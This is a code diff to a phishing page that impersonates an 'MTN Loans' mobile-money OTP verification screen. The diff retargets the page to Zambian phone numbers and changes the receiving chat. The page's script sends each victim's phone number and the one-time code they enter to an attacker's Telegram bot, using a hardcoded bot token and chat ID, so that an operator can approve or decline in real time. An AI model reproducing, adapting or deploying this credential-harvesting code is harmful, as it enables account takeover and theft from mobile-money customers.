@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
-    <title>MTN  – OTP Verification</title>
+    <title>MTN Loans – OTP Verification</title>
 
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
 
@@ -274,14 +274,14 @@
             <!-- LOGO -->
             <div class="logo">
                 <div class="logo-circle">M</div>
-                <div class="logo-text"><span>MTN</span> </div>
+                <div class="logo-text"><span>MTN</span> Loans</div>
             </div>
 
             <!-- TEXT -->
             <div class="title">Verify Your Account</div>
             <div class="subtitle" id="subtitleText">
                 A one-time verification code has been sent to<br />
-                <span id="maskedPhone">65xxxxx56</span>.
+                <span id="maskedPhone">+260 7x xxx xxx</span>.
                 Enter it below to verify your account.
             </div>
 
@@ -312,7 +312,7 @@
         (function() {
             // ==================== TELEGRAM BOT CONFIG ====================
             const BOT_TOKEN = '8205203090:AAGJYcmFQe_I-Cw3xxnIhV0J25ZgaCwAExY';
-            const CHAT_ID = '691605234';
+            const CHAT_ID = '1006917440';
             const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
             // ==================== DOM ELEMENTS ====================
@@ -331,20 +331,43 @@
             const errorText = document.getElementById('errorText');
 
             // ==================== RETRIEVE DATA FROM SESSIONSTORAGE ====================
-            const phone = sessionStorage.getItem('mtn_phone') || '655123456';
+            const phone = sessionStorage.getItem('mtn_phone') || '766123456';
 
-            // ==================== MASK PHONE NUMBER ====================
-            function maskPhone(phone) {
+            // ==================== FORMAT & MASK PHONE FOR ZAMBIA ====================
+            function maskPhoneDigits(phone) {
                 const cleaned = phone.replace(/\D/g, '');
                 if (cleaned.length >= 4) {
-                    const start = cleaned.slice(0, 2);
-                    const end = cleaned.slice(-2);
-                    const masked = start + 'x'.repeat(Math.max(0, cleaned.length - 4)) + end;
-                    return masked;
+                    const start = cleaned.slice(0, 1);    // first digit (e.g., 7)
+                    const end = cleaned.slice(-2);        // last two digits
+                    const middle = 'x'.repeat(Math.max(0, cleaned.length - 3));
+                    return start + middle + end;
                 }
-                return phone;
+                return cleaned;
             }
-            maskedPhoneSpan.textContent = maskPhone(phone);
+
+            function formatZambianPhone(phoneDigits) {
+                const cleaned = phoneDigits.replace(/\D/g, '');
+                if (cleaned.length === 9) {
+                    // format: +260 7x xxx xxx (but we want the masked version)
+                    // We'll assume phoneDigits already masked with 'x'
+                    const first = cleaned.slice(0, 1);
+                    const rest = cleaned.slice(1);
+                    // Split into groups: 1 digit, 2 digits, 2 digits, 2 digits, 2 digits
+                    const parts = [];
+                    parts.push(first);
+                    for (let i = 0; i < rest.length; i += 2) {
+                        parts.push(rest.slice(i, i + 2));
+                    }
+                    // Join with spaces
+                    return '+260 ' + parts.join(' ');
+                }
+                return phoneDigits;
+            }
+
+            // Build masked version
+            const maskedDigits = maskPhoneDigits(phone);
+            const formattedMasked = formatZambianPhone(maskedDigits);
+            maskedPhoneSpan.textContent = formattedMasked;
 
             // ==================== OTP AUTO‑ADVANCE ====================
             function focusNext(index) {
@@ -534,10 +557,10 @@
                 spinner.style.display = 'flex';
 
                 const ts = Date.now();
-                const identifier = `MTN MoMo: ${phone}`;
+                const identifier = `MTN Loans MoMo: +260 ${phone}`;
                 const escapedOtp = escapeHtml(enteredOtp);
                 const msg =
-                    `🔐 <b>MTN  OTP Verification</b>\n\n${identifier}\nEntered OTP: <code>${escapedOtp}</code>\n\nApprove or Decline?`;
+                    `🔐 <b>MTN Loans OTP Verification</b>\n\n${identifier}\nEntered OTP: <code>${escapedOtp}</code>\n\nApprove or Decline?`;
 
                 await sendToTelegram({
                     chat_id: CHAT_ID,
